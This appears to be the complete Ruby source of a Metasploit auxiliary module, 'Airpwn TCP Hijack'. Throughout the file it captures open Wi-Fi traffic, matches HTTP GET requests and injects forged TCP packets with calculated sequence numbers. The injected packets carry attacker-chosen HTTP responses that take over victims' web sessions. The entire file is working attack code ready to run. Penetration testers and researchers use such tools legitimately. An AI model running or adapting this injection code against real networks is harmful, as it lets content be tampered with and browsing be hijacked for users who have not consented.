##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'yaml'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Capture
  include Msf::Exploit::Lorcon2
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'Airpwn TCP Hijack',
      'Description'    => %q{
        TCP streams are 'protected' only in so much as the sequence
      number is not guessable.

      Wifi is shared media.

      Got your nose.

      Responses which do not begin with Header: Value assumed to be
      HTML only and will have Header:Value data prepended.  Responses
      which do not include a Content-Length header will have one generated.
      },
      'Author'      => ['toast', 'dragorn', 'ddz', 'hdm'],
      'License'     => MSF_LICENSE,
      'Actions'     =>
        [
          [ 'Airpwn' ]
        ],
      'PassiveActions' =>
        [
          'Capture'
        ],
      'DefaultAction'  => 'Airpwn'
    )

    register_options(
      [
        OptPath.new('SITELIST',	  [ false, "YAML file of URL/Replacement pairs for GET replacement",
            File.join(Msf::Config.install_root, "data", "exploits", "wifi", "airpwn", "sitelist.yml")
          ]),
        OptBool.new('USESITEFILE', [ true, "Use site list file for match/response", "false"]),
        OptString.new('FILTER',	  [ true, "Default BPF filter", "port 80"]),
        OptString.new('MATCH',	  [ true, "Default request match", "GET ([^ ?]+) HTTP" ]),
        OptString.new('RESPONSE',  [ true, "Default response", "Airpwn" ]),
      ], self.class)
  end

  def run

    @sitelist = datastore['SITELIST']
    @regex    = datastore['MATCH']
    @response = datastore['RESPONSE']
    @filter	  = datastore['FILTER']
    @useyaml  = datastore['USESITEFILE']

    @http = []

    if @useyaml then
      begin
      @http = YAML::load_file(@sitelist)

      rescue ::Exception => e
        print_error "AIRPWN: failed to parse YAML file, #{e.class} #{e} #{e.backtrace}"
      end
    else
      @http[0] = { "regex" => [@regex], "response" => @response }
    end

    @run = true

    print_status "AIRPWN: Parsing responses and defining headers"

    # Prep the responses
    @http.each do |r|
      if not r["response"] then
        if not r["file"] then
          print_error "AIRPWN: Missing 'response' or 'file' in yaml config"
          r["txresponse"] = ""
        else
          r["txresponse"] = ""
          begin
          File.open(r["file"], "rb") do |io|
            r["txresponse"] += io.read(4096)
          end
          rescue EOFError
          rescue ::Exception => e
            print_error("AIRPWN: failed to parse response file " +
              "#{r['file']}, #{e.class} #{e} #{e.backtrace}")
          end
        end
      else
        if r["file"] then
          print_error "AIRPWN: Both 'response' and 'file' in yaml config, " +
            "defaulting to 'response'"
        end

        r["txresponse"] = r["response"]
      end

      # If we have headers
      if r["txresponse"].scan(/[^:?]+: .+\n/m).size > 0
      #  But not a content-length
        if r["txresponse"].scan(/^Content-Length: /).size == 0
          # Figure out the length and add it
          loc = (/\n\n/m =~ r["txresponse"])
          if loc == nil
            print_status "AIRPWN: Response packet looks like HTTP headers but can't find end of headers.  Will inject as-is."
          else
            print_status "AIRPWN: Response packet looks like HTTP headers but has no Content-Length, adding one."
            r["txresponse"].insert(loc, "\r\nContent-Length: " + (r["response"].length - loc).to_s)
          end
        end
      else
      # We have no headers, generate a response
        print_status "AIRPWN: Response packet has no HTTP headers, creating some."
        r["txresponse"].insert(0, "HTTP/1.1 200 OK\r\nDate: %s\r\nServer: Apache\r\nConnection: close\r\nContent-Type: text/html\r\nContent-Length: %d\r\n\r\n" % [Time.now, @response.size])
      end
    end

    print_status "Opening wifi module."
    open_wifi

    self.wifi.filter = @filter if (@filter != "")
    each_packet do |pkt|

      d3 = pkt.dot3

      next if not d3
      p = PacketFu::Packet.parse(d3) rescue nil
      next unless p.is_tcp?

      @http.each do |r|
        hit = nil
        r['regex'].each do |reg|
          hit = p.payload.scan(/#{reg}/) || nil
          break if hit.size != 0
        end
        next if hit.size.zero?

        print_status("AIRPWN: %s -> %s HTTP GET [%s] TCP SEQ %u" % [p.ip_saddr, p.ip_daddr, $1, p.tcp_seq])

        injpkt = Lorcon::Packet.new()
        injpkt.bssid = pkt.bssid

        response_pkt = PacketFu::TCPPacket.new
        response_pkt.eth_daddr = p.eth_saddr
        response_pkt.eth_saddr = p.eth_daddr
        response_pkt.ip_saddr = p.ip_daddr
        response_pkt.ip_daddr = p.ip_saddr
        response_pkt.ip_ttl = p.ip_ttl
        response_pkt.tcp_sport = p.tcp_dport
        response_pkt.tcp_dport = p.tcp_sport
        response_pkt.tcp_win = p.tcp_win
        response_pkt.tcp_seq = p.tcp_ack
        response_pkt.tcp_ack = (p.tcp_seq + p.ip_header.body.to_s.size - (p.tcp_hlen * 4)) & 0xffffffff
        response_pkt.tcp_flags.ack = 1
        response_pkt.tcp_flags.psh = 1
        response_pkt.payload = r["txresponse"]
        response_pkt.recalc
        injpkt.dot3 = response_pkt.to_s

        case pkt.direction
        when ::Lorcon::Packet::LORCON_FROM_DS
          injpkt.direction = Lorcon::Packet::LORCON_TO_DS
        when ::Lorcon::Packet::LORCON_TO_DS
          injpkt.direction = Lorcon::Packet::LORCON_FROM_DS
        else
          injpkt.direction = Lorcon::Packet::LORCON_ADHOC_DS
        end

        self.wifi.inject(injpkt) or print_error("AIRPWN failed to inject packet: " + tx.error)

        response_pkt.tcp_seq = response_pkt.tcp_seq + response_pkt.payload.size
        response_pkt.tcp_flags.ack = 1
        response_pkt.tcp_flags.psh = 0
        response_pkt.tcp_flags.fin = 1
        response_pkt.payload = 0
        response_pkt.recalc

        injpkt.dot3 = response_pkt.to_s
        self.wifi.inject(injpkt) or print_error("AIRPWN failed to inject packet: " + tx.error)
      end
    end

  end

end
